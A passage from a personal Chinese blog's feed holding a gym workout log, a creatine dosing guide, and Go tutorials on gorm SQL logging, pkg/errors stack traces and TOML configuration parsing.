8</li></ul></li><li>蝴蝶机练后束32kg 6 6 6 6</li></ul><h1 id="2022-01-05-星期三（背）"><a href="#2022-01-05-星期三（背）" class="headerlink" title="2022-01-05 星期三（背）"></a>2022-01-05 星期三（背）</h1><ul><li>宽引体向上14kg⬆ 6 6 6 5.5 2.3</li><li>器械划船45kg 8 8 8 8</li><li>杠铃划船20kg 10</li><li>单臂划船36.25kg 6 6 6 7</li><li>重锤高位下拉45kg 8 8 8 8</li></ul><h1 id="2022-01-06-星期四（硬拉，背）"><a href="#2022-01-06-星期四（硬拉，背）" class="headerlink" title="2022-01-06 星期四（硬拉，背）"></a>2022-01-06 星期四（硬拉，背）</h1><ul><li>传统硬拉<ul><li>40kg 7</li><li>50kg 5</li><li>60kg 3 3 3 3</li></ul></li><li>器械划船50kg 8 8 8 8</li></ul><h1 id="2022-01-07-星期五（胸）"><a href="#2022-01-07-星期五（胸）" class="headerlink" title="2022-01-07 星期五（胸）"></a>2022-01-07 星期五（胸）</h1><ul><li>蝴蝶机夹胸32kg 9 8 8 8</li><li>杠铃卧推<ul><li>20kg 18</li><li>40kg 9</li><li>50kg 5</li><li>52.5kg 5 4 3</li></ul></li><li>哑铃上斜卧推20kg 6 6 6 6 6</li><li>器械推胸21.8kg 5 5 5 5</li><li>双杠臂屈伸50kg 12 12 14 9 8</li></ul><h1 id="2022-01-10-星期一"><a href="#2022-01-10-星期一" class="headerlink" title="2022-01-10 星期一"></a>2022-01-10 星期一</h1><ul><li>蝴蝶机夹胸<ul><li>50kg 3</li><li>32kg 5</li></ul></li><li>坡度快走20分钟</li><li>宽距引体 6</li></ul><h1 id="2022-01-11-星期二（肩）"><a href="#2022-01-11-星期二（肩）" class="headerlink" title="2022-01-11 星期二（肩）"></a>2022-01-11 星期二（肩）</h1><ul><li>坐姿哑铃推肩12kg 9</li><li>杠铃推肩20kg 10 7</li><li>坐姿哑铃推肩<ul><li>16kg 8</li><li>20kg 7 7 6 6 7</li></ul></li><li>哑铃侧平举<ul><li>12kg 12 10 8 7 4</li><li>6kg 8</li></ul></li><li>绳索面拉32kg 9 8 8 9</li><li>蝴蝶机练后束36kg 6 5 5 5</li></ul><h1 id="2022-01-12-星期三（背）"><a href="#2022-01-12-星期三（背）" class="headerlink" title="2022-01-12 星期三（背）"></a>2022-01-12 星期三（背）</h1><ul><li>宽距引体向上14kg⬆ 6 6 7 6 5</li><li>器械划船<ul><li>50kg 6</li><li>54kg 6 8</li><li>59kg 6 8</li></ul></li><li>单臂划船<ul><li>36.25kg 6 6</li><li>37.5kg 6 6</li></ul></li><li>重锤高位下拉50kg 7 7 7 7</li></ul><h1 id="2022-01-13-星期四（硬拉）"><a href="#2022-01-13-星期四（硬拉）" class="headerlink" title="2022-01-13 星期四（硬拉）"></a>2022-01-13 星期四（硬拉）</h1><ul><li>传统硬拉<ul><li>60kg 3 4 5</li><li>80kg 2 2 2 2</li><li>60kg 4 5</li></ul></li></ul><h1 id="2022-01-14-星期五（胸）"><a href="#2022-01-14-星期五（胸）" class="headerlink" title="2022-01-14 星期五（胸）"></a>2022-01-14 星期五（胸）</h1><ul><li>蝴蝶机夹胸32kg 8 8 6 6</li><li>上斜杠铃卧推<ul><li>20kg 12</li><li>40kg 8</li><li>50kg 4 3 3 1</li></ul></li><li>平板杠铃卧推<ul><li>40kg 7</li><li>50kg 5 4 4 3 2</li></ul></li><li>器械推胸26.8kg 5 4 3 3</li><li>双杠臂屈伸45kg⬆ 8 8 8 8 8</li></ul><h1 id="2022-01-17-星期一（背）"><a href="#2022-01-17-星期一（背）" class="headerlink" title="2022-01-17 星期一（背）"></a>2022-01-17 星期一（背）</h1><ul><li>宽距引体14kg⬆ 6 6 6 5 4 5</li></ul><h1 id="2022-01-18-星期二（背）"><a href="#2022-01-18-星期二（背）" class="headerlink" title="2022-01-18 星期二（背）"></a>2022-01-18 星期二（背）</h1><ul><li>高位下拉<ul><li>27kg 12</li><li>45kg 7</li><li>52kg 6 6 6 6</li></ul></li><li>器械划船63kg 6 6 6 6</li><li>单臂划船37.5kg 6 6 6 6</li><li>绳索重锤高位下拉63kg 6 6 6 6</li></ul><h1 id="2022-01-19-星期三（胸）"><a href="#2022-01-19-星期三（胸）" class="headerlink" title="2022-01-19 星期三（胸）"></a>2022-01-19 星期三（胸）</h1><ul><li>俯卧撑 25</li><li>平板杠铃卧推<ul><li>20kg 13</li><li>40kg 9</li><li>55kg 3 4 4 4 2</li></ul></li><li>哑铃上斜卧推<ul><li>20kg 8</li><li>22kg 5 6 5 5</li></ul></li><li>器械推胸26.8kg 4 5 4 3.5</li><li>双杠臂屈伸36kg 6 6 7 6</li></ul><h1 id="2022-01-20-星期四（硬拉）"><a href="#2022-01-20-星期四（硬拉）" class="headerlink" title="2022-01-20 星期四（硬拉）"></a>2022-01-20 星期四（硬拉）</h1><ul><li>传统硬拉<ul><li>20kg 10</li><li>40kg 8 8</li><li>60kg 3 5 6 6 3</li></ul></li></ul><h1 id="2022-01-24-星期一（胸）"><a href="#2022-01-24-星期一（胸）" class="headerlink" title="2022-01-24 星期一（胸）"></a>2022-01-24 星期一（胸）</h1><ul><li>俯卧撑27个</li><li>平板杠铃卧推<ul><li>20kg 9</li><li>40kg 8</li><li>45kg 8 8 8</li></ul></li><li>上斜哑铃卧推22kg 5 6 6 6</li><li>双杠臂屈伸45kg 8 8 8 8</li></ul><h1 id="2022-01-25-星期二（背）"><a href="#2022-01-25-星期二（背）" class="headerlink" title="2022-01-25 星期二（背）"></a>2022-01-25 星期二（背）</h1><ul><li>引体向上14kg 6 6 6 6 6</li><li>器械划船 63kg 6 6 6 6</li><li>单臂划船37.5kg 6 6 6 6</li><li>重锤下拉45kg 6 6 6 7</li></ul><h1 id="2022-01-26-星期三（手臂）"><a href="#2022-01-26-星期三（手臂）" class="headerlink" title="2022-01-26 星期三（手臂）"></a>2022-01-26 星期三（手臂）</h1><ul><li>龙门架二头弯举32kg 9</li><li>直杆杠铃二头弯举25kg 6 6 6 5</li><li>曲杆杠铃二头弯举<ul><li>20kg 8 9</li><li>25kg 6 6 6 6</li></ul></li><li>双杠臂屈伸 12 12 12 10</li><li>史密斯窄距卧推<ul><li>20kg 6 9</li><li>25kg 8 8 8 8</li></ul></li></ul><h1 id="2022-01-28-星期五（胸）"><a href="#2022-01-28-星期五（胸）" class="headerlink" title="2022-01-28 星期五（胸）"></a>2022-01-28 星期五（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 15</li><li>40kg 8</li><li>55kg 4 3</li><li>50kg 6 6 5 5</li></ul></li><li>上斜哑铃卧推22kg 4 5 5 4</li><li>器械推胸21.8kg 6 6 5 5</li><li>双杠臂屈伸45kg 8 8 8 8</li></ul><h1 id="2022-01-30-星期天（背）"><a href="#2022-01-30-星期天（背）" class="headerlink" title="2022-01-30 星期天（背）"></a>2022-01-30 星期天（背）</h1><ul><li>引体向上14kg 6 6 6 7</li><li>器械划船 63kg 6 6 6 6</li><li>重锤下拉50kg 8 8 8 8</li><li>窄距对握高位下拉32kg 8 8 8 8</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2021-11-08-星期一（肩-腹肌）&quot;&gt;&lt;a href=&quot;#2021-11-08-星期一（肩-腹肌）&quot; class=&quot;headerlink&quot; title=&quot;2021-11-08 星期一（肩+腹肌）&quot;&gt;&lt;/a&gt;2021-11-08 星期一（肩+腹肌）&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="健身" scheme="https://blog.smilexin.cn/tags/%E5%81%A5%E8%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>肌酸使用方法详解</title>
    <link href="https://blog.smilexin.cn/2021/11/08/%E8%82%8C%E9%85%B8%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3.html"/>
    <id>https://blog.smilexin.cn/2021/11/08/肌酸使用方法详解.html</id>
    <published>2021-11-07T16:00:00.000Z</published>
    <updated>2021-11-08T06:33:32.064Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>肌酸：最开始服用的5-7天，20克/天，分4次，分别在清晨、午餐或晚餐后、运动前30分钟内、运动后30分钟内服用</p></blockquote><p>具体使用方法如下：</p><p><strong>肌酸冲击期</strong></p><p>1.清晨(肌酸冲击期1)：将5克肌酸与20克健身饮一同溶于200毫升温水中一同服用或将5克肌酸与200果汁一同服用。</p><p>2.午餐或晚餐后(肌酸冲击期2)：将5克肌酸与20克健身饮一同溶于200毫升温水中一同服用或将5克肌酸与200毫升果汁一同服用 。</p><p>3.运动前30分钟内和运动中(肌酸冲击期3) ：运动前，将40克健身饮与5克肌酸一同用400毫升温水冲开，在运动前30分钟服用150ml，其余运动中服尽。如果每次运动时 间达到1.5-2小时，健身饮使用量加倍。</p><p>4.运动后30分钟内(肌酸冲击期4)：将5克肌酸与20克健身饮、30克蛋白粉一同溶于200毫升温水中一同服用。</p><p><strong>肌酸维持期</strong></p><p>运动前，将40克健身饮与5克肌酸一同用400毫升温水冲开，在运动前30分钟服用150ml，其余运动中服尽。如果每次运动时间达到1.5-2小时，健身饮使用量加倍。</p><p>注意事项：</p><ol><li><p>与健身饮冲服可防止肌酸起效过程中出现的肌肉发紧、发僵或痉挛的不适感；若出现以上不适感，需要增加补水、补糖的量。</p></li><li><p>不能用热水和含咖啡因的饮料一起服用，否则会严重影响肌酸效果。</p></li></ol><blockquote><p>提示：冲击期+高强度训练可以让肌肉长得更快，维持期巩固增长，停用期后再次冲击期效果比一直使用维持期效果更佳，也就是说要用用停停效果才最好。</p></blockquote><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/jianshen/jsfyff.jpg" alt="肌酸服用方法" title="">                </div>                <div class="image-caption">肌酸服用方法</div>            </figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;肌酸：最开始服用的5-7天，20克/天，分4次，分别在清晨、午餐或晚餐后、运动前30分钟内、运动后30分钟内服用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;具体使用方法如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;肌酸冲击期&lt;/strong&gt;&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="健身" scheme="https://blog.smilexin.cn/tags/%E5%81%A5%E8%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>gorm 打印执行的sql</title>
    <link href="https://blog.smilexin.cn/2021/10/21/gorm%20%E6%89%93%E5%8D%B0%E6%89%A7%E8%A1%8C%E7%9A%84sql.html"/>
    <id>https://blog.smilexin.cn/2021/10/21/gorm 打印执行的sql.html</id>
    <published>2021-10-20T16:00:00.000Z</published>
    <updated>2021-10-21T06:55:43.129Z</updated>
    
    <content type="html"><![CDATA[<h1 id="打印所有sql"><a href="#打印所有sql" class="headerlink" title="打印所有sql"></a>打印所有sql</h1><p>在打开连接时设置日志级别为Info<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DB, err = gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;</span><br><span class="line">    Logger:logger.Default.LogMode(logger.Info),</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h1 id="打印单条sql"><a href="#打印单条sql" class="headerlink" title="打印单条sql"></a>打印单条sql</h1><p>在操作前加<code>Debug()</code>,相当于将临时将日志级别改为Info<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DB.Debug().Where(<span class="string">"ID = ?"</span>, <span class="number">52</span>).First(&amp;newData)</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//[0.773ms] [rows:1] SELECT * FROM `User` WHERE ID = 52 ORDER BY `User`.`id` LIMIT 1</span></span><br></pre></td></tr></table></figure></p><h1 id="只打印慢查询"><a href="#只打印慢查询" class="headerlink" title="只打印慢查询"></a>只打印慢查询</h1><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">slowLogger := logger.New(</span><br><span class="line"><span class="comment">//将标准输出作为Writer</span></span><br><span class="line">log.New(os.Stdout, <span class="string">"\r\n"</span>, log.LstdFlags),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logger.Config&#123;</span><br><span class="line"><span class="comment">//设定慢查询时间阈值为1ms</span></span><br><span class="line">SlowThreshold: <span class="number">1</span> * time.Microsecond,   </span><br><span class="line"><span class="comment">//设置日志级别，只有Warn和Info级别会输出慢查询日志</span></span><br><span class="line">LogLevel: logger.Warn, </span><br><span class="line">&#125;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DB, err = gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;</span><br><span class="line">Logger:slowLogger,</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="comment">//输出类似</span></span><br><span class="line"><span class="comment">//2021/05/14 11:36:28 /home/ballqiu/go/gorm/mydb.go:98 SLOW SQL &gt;= 1ms</span></span><br><span class="line"><span class="comment">//[2.996ms] [rows:1] INSERT INTO `User` (`name`,`age`,`is_admin`,`is_valid`,`login_time`) VALUES ('ball',0,true,false,'2021-05-14 11:36:28.436')</span></span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>默认的SlowThreshold为200ms</li><li>如果你不想改变这个默认值，那么只需要将日志级别改为Warn即可只打印慢查询。</li></ul><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DB, err = gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;</span><br><span class="line">    Logger:logger.Default.LogMode(logger.Warn),</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;打印所有sql&quot;&gt;&lt;a href=&quot;#打印所有sql&quot; class=&quot;headerlink&quot; title=&quot;打印所有sql&quot;&gt;&lt;/a&gt;打印所有sql&lt;/h1&gt;&lt;p&gt;在打开连接时设置日志级别为Info&lt;br&gt;&lt;figure class=&quot;highlight gola
      
    
    </summary>
    
    
      <category term="Golang" scheme="https://blog.smilexin.cn/tags/Golang/"/>
    
      <category term="gorm" scheme="https://blog.smilexin.cn/tags/gorm/"/>
    
  </entry>
  
  <entry>
    <title>Golang 获取异常堆栈信息</title>
    <link href="https://blog.smilexin.cn/2021/10/20/Golang%20%E8%8E%B7%E5%8F%96%E5%BC%82%E5%B8%B8%E5%A0%86%E6%A0%88%E4%BF%A1%E6%81%AF.html"/>
    <id>https://blog.smilexin.cn/2021/10/20/Golang 获取异常堆栈信息.html</id>
    <published>2021-10-19T16:00:00.000Z</published>
    <updated>2021-10-20T03:54:53.595Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为Go语言提供的错误太简单了，以至于简单的我们无法更好的处理问题，甚至不能为我们处理错误，提供更有用的信息，所以诞生了很多对错误处理的库，<code>github.com/pkg/errors</code>是比较简洁的一样，并且功能非常强大，受到了大量开发者的欢迎，使用者很多。</p><p>它的使用非常简单，如果我们要新生成一个错误，可以使用<code>New</code>函数,生成的错误，自带调用堆栈信息。<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(message <span class="keyword">string</span>)</span> <span class="title">error</span></span></span><br></pre></td></tr></table></figure></p><p>如果有一个现成的<code>error</code>，我们需要对他进行再次包装处理，这时候有三个函数可以选择。<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只附加新的信息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithMessage</span><span class="params">(err error, message <span class="keyword">string</span>)</span> <span class="title">error</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//只附加调用堆栈信息</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">WithStack</span><span class="params">(err error)</span> <span class="title">error</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//同时附加堆栈和信息</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Wrap</span><span class="params">(err error, message <span class="keyword">string</span>)</span> <span class="title">error</span></span></span><br></pre></td></tr></table></figure></p><p>其实上面的包装，很类似于Java的异常包装，被包装的<code>error</code>，其实就是<code>Cause</code>,在前面的章节提到错误的根本原因，就是这个Cause。所以这个错误处理库为我们提供了<code>Cause</code>函数让我们可以获得最根本的错误原因。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Cause</span><span class="params">(err error)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">type</span> causer <span class="keyword">interface</span> &#123;</span><br><span class="line">Cause() error</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">cause, ok := err.(causer)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">err = cause.Cause()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>for</code>循环一直找到最根本（最底层）的那个<code>error</code>。</p><p>以上的错误我们都包装好了，也收集好了，那么怎么把他们里面存储的堆栈、错误原因等这些信息打印出来呢？其实，这个错误处理库的错误类型，都实现了<code>Formatter</code>接口，我们可以通过<code>fmt.Printf</code>函数输出对应的错误信息。</p><blockquote><p>%s,%v //功能一样，输出错误信息，不包含堆栈<br>%q //输出的错误信息带引号，不包含堆栈<br>%+v //输出错误信息和堆栈</p></blockquote><p>以上如果有循环包装错误类型的话，会递归的把这些错误都会输出。</p><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"github.com/pkg/errors"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">_, err := os.Open(<span class="string">"abc"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">err = errors.WithStack(err)</span><br><span class="line">fmt.Println(err.Error()) <span class="comment">// 打印普通信息</span></span><br><span class="line">fmt.Println(fmt.Sprintf(<span class="string">"%+v"</span>, err)) <span class="comment">// 打印信息附带堆栈信息</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>通过使用这个 <code>github.com/pkg/errors</code> 错误库，我们可以收集更多的信息，可以让我们更容易的定位问题。</p><p>我们收集的这些信息不止可以输出到控制台，也可以当做日志，使用输出到相应的<code>Log</code>日志里，便于分析问题。</p><p>据说这个库，会被加入到 Golang 标准 SDK 里，期待着，如果加入的话，应该就是补充现在标准库里的<code>errors</code>这个package了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因为Go语言提供的错误太简单了，以至于简单的我们无法更好的处理问题，甚至不能为我们处理错误，提供更有用的信息，所以诞生了很多对错误处理的库，
      
    
    </summary>
    
    
      <category term="Golang" scheme="https://blog.smilexin.cn/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>Golang TOML配置处理</title>
    <link href="https://blog.smilexin.cn/2021/10/19/Golang%20TOML%E9%85%8D%E7%BD%AE%E5%A4%84%E7%90%86.html"/>
    <id>https://blog.smilexin.cn/2021/10/19/Golang TOML配置处理.html</id>
    <published>2021-10-18T16:00:00.000Z</published>
    <updated>2021-10-19T06:52:30.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个项目通常是有很多配置的，比如PHP的php.ini文件、Nginx的server.conf文件，那么Golang的项目又适合使用怎样的配置文件呢？</p><p>其实现在我们有很多选择，比如 JSON文件、INI文件、YAML文件和TOML文件等等。</p><p>其中这些文件，对应的Golang处理库如下：</p><ul><li>encoding/json – 标准库中的包，可以处理JSON配置文件，缺点是不能加注释</li><li>gcfg – 处理INI配置文件</li><li>toml – 处理TOML配置文件</li><li>viper – 处理JSON, TOML, YAML, HCL以及Java properties配置文件</li></ul><p><strong>其实关于怎么选择可以看看stackoverflow上的问题How to handle configuration in Go。</strong></p><p>我根据自己的喜好选了TOML，下面就来说下TOML。</p><p>先来看一个TOML文件的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># This is a TOML document.</span><br><span class="line"></span><br><span class="line">title = &quot;TOML Example&quot;</span><br><span class="line"></span><br><span class="line">[owner]</span><br><span class="line">name = &quot;Tom Preston-Werner&quot;</span><br><span class="line">dob = 1979-05-27T07:32:00-08:00 # First class dates</span><br><span class="line"></span><br><span class="line">[database]</span><br><span class="line">server = &quot;192.168.1.1&quot;</span><br><span class="line">ports = [ 8001, 8001, 8002 ]</span><br><span class="line">connection_max = 5000</span><br><span class="line">enabled = true</span><br><span class="line"></span><br><span class="line">[servers]</span><br><span class="line"></span><br><span class="line"># Indentation (tabs and/or spaces) is allowed but not required</span><br><span class="line">[servers.alpha]</span><br><span class="line">ip = &quot;10.0.0.1&quot;</span><br><span class="line">dc = &quot;eqdc10&quot;</span><br><span class="line"></span><br><span class="line">[servers.beta]</span><br><span class="line">ip = &quot;10.0.0.2&quot;</span><br><span class="line">dc = &quot;eqdc10&quot;</span><br><span class="line"></span><br><span class="line">[clients]</span><br><span class="line">data = [ [&quot;gamma&quot;, &quot;delta&quot;], [1, 2] ]</span><br><span class="line"></span><br><span class="line"># Line breaks are OK when inside arrays</span><br><span class="line">hosts = [</span><br><span class="line">  &quot;alpha&quot;,</span><br><span class="line">  &quot;omega&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>大家可以看到这里的格式非常灵活，可以是数字、字符串、布尔等简单类型，也可以是数组、map等等复杂的类型。</p><p>关于具体的TOML语言的解说大家查看文档 toml-lang/toml</p><p>下面我们再来说一下，具体的Golang代码中如何使用：</p><h1 id="读取TOML配置"><a href="#读取TOML配置" class="headerlink" title="读取TOML配置"></a>读取TOML配置</h1><p>首先安装依赖包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/BurntSushi/toml</span><br></pre></td></tr></table></figure><p>然后基于上面的配置文件来定义Golang中配置的struct，如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> tomlConfig <span class="keyword">struct</span> &#123;</span><br><span class="line">Title <span class="keyword">string</span></span><br><span class="line">Owner ownerInfo</span><br><span class="line">DB database <span class="string">`toml:"database"`</span></span><br><span class="line">Servers <span class="keyword">map</span>[<span class="keyword">string</span>]server</span><br><span class="line">Clients clients</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ownerInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Org <span class="keyword">string</span> <span class="string">`toml:"organization"`</span></span><br><span class="line">Bio <span class="keyword">string</span></span><br><span class="line">DOB time.Time</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> database <span class="keyword">struct</span> &#123;</span><br><span class="line">Server <span class="keyword">string</span></span><br><span class="line">Ports []<span class="keyword">int</span></span><br><span class="line">ConnMax <span class="keyword">int</span> <span class="string">`toml:"connection_max"`</span></span><br><span class="line">Enabled <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> server <span class="keyword">struct</span> &#123;</span><br><span class="line">IP <span class="keyword">string</span></span><br><span class="line">DC <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> clients <span class="keyword">struct</span> &#123;</span><br><span class="line">Data [][]<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">Hosts []<span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一些都定义好之后，我们只需要将文件配置中的内容转成Golang中可用的struct实例即可，代码如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> conf tomlConfig</span><br><span class="line">filePath := <span class="string">"/your/path/config.toml"</span></span><br><span class="line"><span class="keyword">if</span> _, err := toml.DecodeFile(filePath, &amp;conf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">log.Println(conf.Title)</span><br></pre></td></tr></table></figure><p>这样我们拿到的 <code>conf</code> 就是拥有TOML文件内容的<code>tomlConfig</code>的实例，可以直接使用。</p><h1 id="配置的单例模式"><a href="#配置的单例模式" class="headerlink" title="配置的单例模式"></a>配置的单例模式</h1><p>通常来说，在一个项目中，配置文件只需要解析一次，所以可以使用单例模式包装一下config的解析。</p><p>代码如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">conf * tomlConfig</span><br><span class="line">once sync.Once</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Config</span><span class="params">()</span> *<span class="title">tomlConfig</span></span> &#123;</span><br><span class="line">once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">filePath, err := filepath.Abs(<span class="string">"./toml/config.toml"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> 